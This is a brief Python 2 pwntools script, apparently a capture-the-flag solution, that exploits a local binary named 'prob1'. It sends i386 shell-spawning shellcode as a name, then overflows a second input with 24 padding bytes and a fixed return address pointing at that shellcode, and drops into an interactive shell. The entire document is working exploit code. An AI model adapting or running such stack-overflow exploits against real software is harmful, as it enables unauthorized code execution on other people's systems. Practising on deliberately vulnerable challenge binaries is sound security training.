from pwn import *

p = process("./prob1")

shellcode = shellcraft.i386.linux.sh()
name = 0x804a060

payload1 = ''
payload1 += asm(shellcode)

payload2 = ''
payload2 += "A"*24
payload2 += p32(name)

print p.recvuntil("Name : ")
p.sendline(payload1)
print p.recvuntil("input : ")
p.sendline(payload2)
p.interactive()
